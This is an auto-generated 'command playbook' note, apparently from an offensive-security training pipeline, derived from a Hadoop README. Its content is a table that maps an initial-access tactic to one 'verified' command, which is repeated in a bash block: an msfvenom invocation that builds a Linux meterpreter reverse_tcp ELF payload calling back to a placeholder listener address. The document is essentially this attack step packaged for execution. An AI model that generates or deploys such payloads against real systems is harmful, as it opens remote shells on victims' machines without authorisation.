---
title: "Trained Command Playbook: Hadoop_README.md"
tags:
  - https
  - initial_access_exploitation
  - kerberos
  - mdp
  - msfvenom
  - text
  - trained
source_file: Hadoop_README.md
updated: 2026-10-24 00:58:24
---

# Trained Command Playbook: `Hadoop_README.md`

- **Source Document:** `~/Projects/CORA/Training/Hadoop_README.md`
- **CEGAR Verified Commands:** `1` (`0` malformed/unsafe snippets filtered)
- **MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`):** `1`
- **Discovered IPs/Subnets:** `None`
- **Discovered Interfaces:** `None`
- **Related Knowledge Note:** [[knowledge/trained_hadoop_readme]]

## Distilled MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`)
| Pre-State ($s$) | Tactic ($\tau$) | Technique ($k$) | Tool ($u$) | Post-State ($s'$) | Verified Command ($c$) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `msfvenom` | `s_initial_shell_or_api_access` | `msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<IP address> -f elf -o msf.payload` |

## Verified Executable Commands (Grouped by Capability Layer)

### General_System (1 commands)
```bash
msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<IP address> -f elf -o msf.payload
```

